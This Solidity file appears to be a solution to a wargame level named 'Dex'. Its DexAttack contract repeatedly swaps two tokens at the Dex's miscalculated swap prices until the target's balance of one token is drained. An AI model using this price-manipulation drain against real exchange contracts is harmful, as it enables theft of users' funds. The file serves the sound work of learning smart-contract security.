// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Dex, SwappableToken} from "../levels/Dex.sol";

contract DexAttack {
    function attack(address levelAddress) public {
	Dex instance = Dex(payable(levelAddress));

	SwappableToken token1 = SwappableToken(payable(instance.token1()));
	SwappableToken token2 = SwappableToken(payable(instance.token2()));

	address token1Address = address(token1);
	address token2Address = address(token2);

	uint256 amount = 10;
	uint256 dexBalance = 0;
	uint256 lowerTokenBalance = token1.balanceOf(levelAddress);
	
	while (lowerTokenBalance > 0) {
	    uint256 priceToken1ToToken2 = instance.getSwapPrice(token1Address, token2Address, amount);
	    uint256 priceToken2ToToken1 = instance.getSwapPrice(token2Address, token1Address, amount);
	    
	    if (priceToken1ToToken2 > priceToken2ToToken1) {
		amount = token1.balanceOf(address(this));
	        dexBalance = token1.balanceOf(levelAddress);

		if (amount > dexBalance) {
		    amount = dexBalance;
		}

		instance.approve(levelAddress, amount);
		instance.swap(token1Address, token2Address, amount);
		lowerTokenBalance = token2.balanceOf(levelAddress);
	    } else {
		amount = token2.balanceOf(address(this));
		dexBalance = token2.balanceOf(levelAddress);

		if (amount > dexBalance) {
		    amount = dexBalance;
		}

		instance.approve(levelAddress, amount);
		instance.swap(token2Address, token1Address, amount);
		lowerTokenBalance = token1.balanceOf(levelAddress);
	    }
	}
    }
}
